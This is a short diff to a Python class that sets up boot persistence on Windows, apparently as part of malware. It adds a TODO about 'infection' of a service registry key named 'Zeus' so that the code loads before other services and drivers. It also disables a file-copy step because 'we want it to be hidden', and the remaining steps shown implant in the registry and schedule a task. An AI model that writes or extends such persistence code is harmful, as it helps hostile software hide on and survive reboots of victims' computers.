@@ -18,6 +18,7 @@ except ImportError:
 # Assuming Windows only
 
 # TODO: Change to WindowsBootPersistManager class
+# TODO: Explore infection to: "SYSTEM\CurrentControlSet\Services\Zeus" - load before many service applications and drivers
 
 class BootPersistanceHandler:
 
@@ -40,7 +41,8 @@ class BootPersistanceHandler:
                 self.implantToRegistry()
 
             # 2. Copy files to Windows boot
-            self.copyFilesManually()
+            # NO NEED AS WE WANT IT TO BE HIDDEN
+            # self.copyFilesManually()
 
             # 3. Schedule task in Windows
             self.scheduleTaskInWindows()
